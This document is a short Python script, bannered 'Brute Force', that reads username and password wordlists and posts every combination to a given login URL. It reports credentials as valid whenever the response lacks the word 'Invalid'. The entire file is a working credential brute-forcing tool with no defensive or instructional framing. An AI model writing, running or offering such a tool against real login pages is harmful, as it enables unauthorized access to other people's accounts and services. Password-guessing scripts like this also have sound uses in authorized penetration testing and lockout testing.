#!/usr/bin/python3

import requests
import sys
from colorama import Fore
import pyfiglet 

font = pyfiglet.figlet_format('Brute Force')
print(Fore.CYAN+font)


if len(sys.argv) != 4:
	print(f"Usage: {sys.argv[0]} <url> <username_file> <password_file>")

login_url = sys.argv[1]
usernamelist = sys.argv[2] 
passwordlist = sys.argv[3]

session = requests.Session()

def brute_force():
    with open(usernamelist, 'r') as uf:
        usernames = [line.strip() for line in uf if line.strip()]
    
    with open(passwordlist, 'r') as pf:
        passwords = [line.strip() for line in pf if line.strip()]

    for username in usernames:
        for password in passwords:
            data = {'username': username, 'password': password}
            response = session.post(login_url, data=data)

            if "Invalid" not in response.text:
                print(f"[+] Found valid credentials: {username}:{password}")
                return
            else:
                print(f"[-] Attempted: {username}:{password}")

brute_force()
